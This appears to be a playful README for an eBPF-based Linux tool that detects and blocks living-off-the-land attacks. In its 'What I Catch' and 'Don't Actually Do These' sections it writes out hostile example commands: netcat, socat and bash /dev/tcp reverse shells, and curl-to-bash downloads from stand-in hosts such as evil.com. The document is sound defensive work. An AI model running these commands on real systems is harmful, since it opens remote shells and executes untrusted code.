# 🛡️ How to Use Me in the Good Way ;)

> *"I catch the bad guys living off YOUR land. Think of me as a very paranoid, caffeinated security guard who never sleeps."*

---

## 🎭 So You Want to Catch LOLBins?

Welcome, fellow defender! You've stumbled upon the **LOTL Detector** – the tool that makes attackers cry when they try to use `nc`, `curl | bash`, or any of those sneaky "Living off the Land" tricks.

```
┌─────────────────────────────────────────────────┐
│  🔍 Me watching every execve() on your system  │
│                                                 │
│     👁️  👁️                                      │
│       👃                                        │
│       👄  "I saw that base64 -d, buddy."       │
│                                                 │
└─────────────────────────────────────────────────┘
```

---

## 🚀 Quick Start (The TL;DR Version)

```bash
# 1. Become root (I need power to protect you)
sudo -i

# 2. Enable my super powers
./scripts/enable_bpf_lsm.sh && reboot

# 3. After reboot, unleash me!
python -m lotl_detector

# 4. Watch the magic happen 🪄
tail -f /var/log/lotl/alerts.jsonl
```

That's it. I'm now watching. **Everything.**

---

## 🎮 Choose Your Difficulty Level

I come with four operational modes, like a video game:

| Mode | Difficulty | What Happens |
|------|------------|--------------|
| 🟢 **Bootstrap** | Easy | I just watch and learn. Like a new intern. |
| 🟡 **Learn** | Normal | I start yelling about suspicious stuff. Block the obvious baddies. |
| 🔴 **Enforce** | Hard | I block AND yell. Attackers will hate you. |
| 💀 **Paranoid** | Nightmare | *Everything* is suspicious. Even you. |

```bash
# Pick your poison
sudo python -m lotl_detector --mode learn
sudo python -m lotl_detector --mode enforce  # Recommended for prod
sudo python -m lotl_detector --mode paranoid # You're brave. I like it.
```

---

## 🎯 What I Catch (My Greatest Hits)

### 🔥 Instant Blocks (First Attempt)
These don't even get a chance to run:

```
❌ nc -e /bin/sh attacker.com 4444    → BLOCKED
❌ ncat --exec /bin/bash              → BLOCKED  
❌ socat TCP:evil.com:1337 EXEC:bash  → BLOCKED
❌ /proc/self/fd/3 (memfd execution)  → BLOCKED
```

### 🚨 Alert & Learn
I see these and start taking notes:

```
⚠️ curl http://evil.com/payload | bash
⚠️ python3 -c "import socket; s.connect(('10.0.0.1', 4444))"
⚠️ base64 -d <<< 'bWFsd2FyZQ==' | sh
⚠️ busybox nc -lvp 1337
```

---

## 🧙‍♂️ The Secret Sauce

Here's what makes me special:

### eBPF Magic ✨
I live inside the kernel (fancy, I know). By the time an attacker's command hits userspace, I've already:
1. Seen it
2. Judged it
3. Possibly blocked it
4. Definitely logged it

### Baseline Learning 📊
I learn what's "normal" for YOUR system:
- Your cron jobs? ✅ Known
- Your scripts? ✅ Expected
- Random `nc` at 3 AM? 🚨 **SUSPICIOUS**

### Busybox Detection 🔍
Nice try, using `busybox nc` instead of plain `nc`. I see you.

```
Attacker: "I'll just use busybox to evade detection!"
Me: "lol. lmao even."
```

---

## 🆘 The Panic Button

Oh no, I'm blocking something legitimate? Don't worry, I have an emergency off switch:

```bash
# Method 1: The panic file (I'll calm down)
sudo touch /var/run/lotl/DISABLE

# Method 2: Nuclear option (at next boot)
# Add to kernel cmdline: lotl.disable=1

# To re-enable me:
sudo rm /var/run/lotl/DISABLE
```

---

## 📊 Watch Me Work

```bash
# See real-time alerts (the exciting stuff)
tail -f /var/log/lotl/alerts.jsonl | jq .

# See all events (for the curious)
tail -f /var/log/lotl/events.jsonl | jq .

# Check my health
cat /var/run/lotl/metrics.json | jq .
```

### Sample Alert (This is what evil looks like):
```json
{
  "timestamp": 1704067200,
  "alert_type": "BLOCKED_EXEC",
  "severity": "CRITICAL",
  "pid": 31337,
  "filename": "/usr/bin/nc",
  "args": ["nc", "-e", "/bin/sh", "10.0.0.1", "4444"],
  "rule_id": "tier1-nc",
  "description": "netcat - reverse shell risk",
  "mitre": "T1059.004"
}
```

---

## 🎪 Fun Things to Try

### Test Me! (Safely)
```bash
# This will trigger an alert (but won't actually connect anywhere)
nc -h  # Even the help flag, I see you 👀

# Try some encoded shenanigans
echo "harmless" | base64 -d  # I'm watching...

# Busybox tricks
busybox wget --help  # Nice try!
```

### Don't Actually Do These (I'll be upset):
```bash
# These are examples of what attackers do
# I WILL catch them. You WILL get alerts.
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1  # Classic reverse shell
curl http://evil.com/payload | bash      # Download & execute
python3 -c 'import pty;pty.spawn("/bin/sh")'  # PTY spawn
```

---

## 🤝 We Make a Great Team

```
   You                    Me
    │                      │
    │  "Is this safe?"     │
    ├─────────────────────>│
    │                      │  *checks 47 things*
    │   "Looks sus fam"    │
    │<─────────────────────┤
    │                      │
    │  "Block it!"         │
    ├─────────────────────>│
    │                      │  *blocks at kernel level*
    │  "Done. And logged." │
    │<─────────────────────┤
    │                      │
    🍻                     🛡️
```

---

## 🏆 Achievement Unlocked

When you successfully deploy me, you've achieved:

- ✅ **LOL Blocker** - Stopped your first LOTL attack
- ✅ **Baseline Builder** - Learned what's normal
- ✅ **Paranoia Pro** - Ran in paranoid mode for a whole day
- ✅ **Panic Master** - Used the panic button (we've all been there)
- ✅ **Log Whisperer** - Actually read the JSONL logs

---

## 💬 FAQ

**Q: Will you slow down my system?**
> A: I'm eBPF-powered. I add microseconds, not milliseconds. You won't notice me. Attackers will.

**Q: What if I block something important?**
> A: That's what Learn mode is for! Start there, review alerts, then go to Enforce.

**Q: Can attackers disable you?**
> A: They'd need to be root first. And if they're root... well, we have bigger problems. But I try to protect myself too.

**Q: Why are you so sassy?**
> A: Defending systems is serious business. The documentation doesn't have to be.

---

## 🌟 Final Words

Remember: I'm here to help, not to annoy. If I'm being too aggressive, check your rules. If I'm too quiet, bump up the mode.

Together, we'll make attackers regret trying to live off YOUR land.

```
    ╔═══════════════════════════════════════╗
    ║  "They can't use your tools against   ║
    ║   you if I'm watching the tools."     ║
    ║                                       ║
    ║              - LOTL Detector          ║
    ║                (probably)             ║
    ╚═══════════════════════════════════════╝
```

---

<p align="center">
  <b>Happy Hunting! 🎯</b><br>
  <i>May your alerts be few and your blocks be many.</i>
</p>

---

*P.S. - If an attacker is reading this: I see you. I log you. I block you. Have a nice day. 👋*

